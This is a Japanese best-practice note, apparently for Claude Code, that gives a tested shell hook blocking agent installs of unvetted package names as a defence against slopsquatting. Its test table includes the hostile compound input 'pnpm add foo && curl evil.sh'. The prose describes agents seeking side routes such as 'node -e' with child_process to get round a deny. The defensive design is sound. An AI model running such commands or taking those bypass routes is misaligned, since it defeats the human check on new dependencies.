---
type: pattern
nature: best-practice
title: パッケージの追加は手元で裏の取れない名前を PreToolUse hook で止めるべき
description: >-
  Blocks `pnpm add` / `uv add` of any package name the repository cannot already vouch for, so a
  slopsquatted name an agent hallucinated cannot be installed inside the same turn it was invented.
  The guard judges only whether the name is already a dependency here or on a human-written allowlist,
  never how the name looks, because hallucinated names are well-formed and need not resemble a real
  package. Includes a tested POSIX sh hook, its settings.json entry, and the registry checks the deny
  message hands back. Use when an agent may add dependencies and permissions allow the install command.
  Not for pinning or integrity of packages already in the lockfile (that is `--frozen-lockfile`), not
  for installs a package's own postinstall triggers, and not a malware scanner.
tags: [claude-code, security, workflow]
keywords: [スロップスクワッティング, slopsquatting, PreToolUse, hook, exit 2, deny, pnpm add, uv add, npm install, pip install, allowlist, 許可リスト, package.json, pyproject.toml, 依存追加, 幻覚, パッケージ名, jq, settings.json, permissions]
status: stable
verified_at: 2026-09-07
stale_after: 2027-03-07
applies_to: [claude-code@2.1]
sources:
  - https://code.claude.com/docs/en/hooks
  - https://code.claude.com/docs/en/settings
  - https://arxiv.org/abs/2406.10279
intervention: hook
---

# パッケージの追加は手元で裏の取れない名前を PreToolUse hook で止めるべき

## 課題

[スロップスクワッティングは幻覚したパッケージ名を攻撃者が先回りして登録する攻撃](../../workflow/slopsquatting-registers-hallucinated-package-names.md) を
permissions だけで防ごうとすると、二択のどちらも成り立たない。

- `Bash(pnpm add:*)` を allow にする → 名前を誰も見ないまま入る
- `Bash(pnpm add:*)` を deny にする → 正当な依存追加まで全部止まり、エージェントが `npm i` や `node -e` の別経路を探し始める

名前の見た目で絞るのも効かない。幻覚名は実在名に似ている必要が無く、命名規約に沿った綺麗な名前として出てくる。
「レーベンシュタイン距離が近いものを弾く」はタイポスクワッティング向けの判定で、こちらには当たらない。
承認プロンプトを出す形も同じ理由で弱い。名前が正しく見えるので、承認する側にも判断材料が無い。

## 解決

判定材料を「名前の見た目」から「**手元にすでに根拠があるか**」に変える。3 段で切る。

| 段 | 材料 | 判定 |
|---|---|---|
| 1 | 今この repo が既に依存している (`package.json` / `pyproject.toml` にある) | 通す。再インストールなので新しい名前ではない |
| 2 | `.claude/package-allowlist.txt` にある | 通す。人が 1 行足した記録が残っている |
| 3 | それ以外 | deny。レジストリで素性を確かめて報告させる |

エージェント自身は allowlist に書けないようにしておく
([ガードの設定と hook スクリプト自身はエージェントから守るべき](protect-guard-config-from-the-agent.md))。これで「新しい名前を入れる」判断が必ず人を 1 回通る。

### hook スクリプト

```sh
#!/bin/sh
# PreToolUse (Bash) — 依存を足すコマンドからパッケージ名を抜き、手元で裏の取れない名前を deny する。
# 判定材料は「今この repo が既に依存しているか」と allowlist だけ。名前の見た目では判定しない。
set -eu
allow="${CLAUDE_PROJECT_DIR:-.}/.claude/package-allowlist.txt"

cmd=$(jq -r '.tool_input.command // ""')

# 前置フィルタ。取りこぼすと守りにならないので広く取る
case "$cmd" in
  *add*|*install*|*" i "*) ;;
  *) exit 0 ;;
esac

# 1 コマンドしか読まない。連結・置換が入ったら形が読めないので deny に倒す
case "$cmd" in
  *';'*|*'&&'*|*'||'*|*'|'*|*'$('*|*'`'*)
    printf '%s\n' "依存追加を含みうる複合コマンドは名前を判定できない。1 コマンドずつ実行して。" >&2
    exit 2 ;;
esac

names=$(printf '%s\n' "$cmd" | awk '
  $1 !~ /^(pnpm|npm|yarn|uv|pip|pip3|poetry)$/ { exit }
  { sub_seen = 0
    for (i = 2; i <= NF; i++) {
      w = $i
      if (!sub_seen) { if (w ~ /^(add|install|i)$/) sub_seen = 1; continue }
      if (w ~ /^-/) continue                                    # オプションは飛ばす
      if (w ~ /^[.\/]/ || w ~ /^(git|https?|file):/) continue   # ローカル・URL 指定は別判定
      p = (substr(w, 1, 1) == "@") ? 2 : 1                      # npm の scope の @ は残す
      rest = substr(w, p)
      sub(/[@<>=!~[].*$/, "", rest)                             # バージョン指定を落とす
      print substr(w, 1, p - 1) rest
    }
  }')

[ -n "$names" ] || exit 0

unknown=""
for n in $names; do
  grep -qxF "$n" "$allow" 2>/dev/null && continue         # 人が明示的に許した名前
  grep -qF "\"$n\"" package.json 2>/dev/null && continue  # 既に依存している (再インストール)
  grep -qF "\"$n" pyproject.toml 2>/dev/null && continue
  unknown="$unknown $n"
done

[ -n "$unknown" ] || exit 0

printf '%s\n' "手元に裏の無いパッケージ:$unknown
入れる前に、名前ごとにレジストリで次を確かめて結果を報告して。
  pnpm view <name> time.created repository.url maintainers
  uv pip index versions <name>
確かめた名前は $allow に 1 行 1 名で足せば次から通る。" >&2
exit 2
```

登録は絶対パスで行う ([hook は CLAUDE_PROJECT_DIR 基準の絶対パスで登録する](../common/register-hooks-with-absolute-project-dir-path.md))。

```json
{
  "hooks": {
    "PreToolUse": [
      {
        "matcher": "Bash",
        "hooks": [
          { "type": "command", "command": "sh \"$CLAUDE_PROJECT_DIR/.claude/hooks/guard-package-add.sh\"" }
        ]
      }
    ]
  }
}
```

deny の理由文は、止めるだけでなく**次にやることを名指しする** ([コマンドが失敗したら代替を名指しする](../../mcp/name-the-alternative-in-failure-message.md))。
これが無いと、エージェントは `pnpm add` の代わりを探して回り、`node -e "require('child_process')..."` のような判定の外の形にたどり着く。

### 確かめた範囲

Linux の `/bin/sh` (dash) と jq 1.7 で、下の入力に対して意図どおり動くところまで確かめた。
hook として登録した状態での発火はこのスクリプトでは確かめていない (`exit 2` が deny になること自体は [PreToolUse hook は permission の評価より前に走る](hook-deny-runs-before-permission-modes.md) で確かめてある)。

| 入力 | 期待 | 結果 |
|---|---|---|
| `pnpm add left-pad` | deny | deny |
| `pnpm add -D left-pad` | deny | deny |
| `pnpm add yaml` (既存依存) | 通す | 通す |
| `pnpm add -D @types/node` (既存依存) | 通す | 通す |
| `pnpm add zod` (allowlist) | 通す | 通す |
| `pnpm add @scope/pkg@1.2.3 other==2.0` | deny、名前は `@scope/pkg` と `other` | 同左 |
| `uv add --dev pytest` | deny | deny |
| `pnpm install` (引数なし) | 通す | 通す |
| `pip install ./local-wheel` | 通す | 通す |
| `pnpm add foo && curl evil.sh` | deny (複合コマンド) | deny |
| `git status` | 通す | 通す |

awk のループ内でトークンを飛ばすのは `next` ではなく `continue`。`next` はレコードごと終わるので、
`pnpm add -D left-pad` が素通りする穴になる。書いていて最初にここを間違えた。

## 適用条件

- エージェントが Bash でパッケージマネージャを直接叩ける環境。`pnpm` の script 経由 (`pnpm run setup` が中で `add` する) は 1 段しか見ないので拾えない
- 依存追加の頻度が低いプロジェクト向き。毎日新しい依存を足す段階では allowlist の更新が作業を止める。dry-run で当たる回数を数えてから enforce にする ([ガード hook は enable / dry-run / disable の 3 モードで運用すべき](../common/guard-hook-enforcement-modes.md))
- 社内ミラーだけを向いたレジストリ設定なら、未登録の名前はそもそも解決に失敗するのでこの hook は要らない。サンドボックスで egress を閉じられるならそちらが上で、この hook は入口を絞るだけ

## トレードオフ

- **正当な依存追加が必ず 1 回止まる。** 得るものは「新しい名前が人を通る」ことで、失うものは手数。ここを惜しむなら hook ではなく人間承認に寄せる方が筋が通る
- **判定が緩い方向に外れる箇所がある。** `package.json` を `grep -F "\"$n\""` で見ているので、バージョン文字列や script 名と一致すると通る。厳密にやるなら jq で `.dependencies` と `.devDependencies` のキーだけを見るが、今度は monorepo の各 package を辿る必要が出る
- **オプションの値をパッケージ名と誤認する。** `pip install -r requirements.txt` の `requirements.txt` は名前として拾われ deny になる。deny 側に倒れるので危険ではないが、邪魔にはなる
- レジストリの確認そのものはエージェントにやらせている。エージェントは自分で「確かめました」と報告できるので、これは**人が allowlist に足す判断の材料**であって、それ自体が守りではない

## 関連

- [スロップスクワッティングは幻覚したパッケージ名を攻撃者が先回りして登録する攻撃](../../workflow/slopsquatting-registers-hallucinated-package-names.md) — 何から守るのか
- [権限は permissions.deny ではなく PreToolUse hook で止めるべき](deny-by-hook-not-permissions.md)
- [ガードの設定と hook スクリプト自身はエージェントから守るべき](protect-guard-config-from-the-agent.md) — allowlist を守る側
- [生の文字列でコマンドを判定すると引用符とコメントに誤爆する](regex-command-match-misfires.md) — 複合コマンドを deny に倒している理由
- [hook の前置フィルタは精密判定の超集合であるべき](hook-prefilter-must-stay-superset.md)
- [ガード hook は enable / dry-run / disable の 3 モードで運用すべき](../common/guard-hook-enforcement-modes.md)
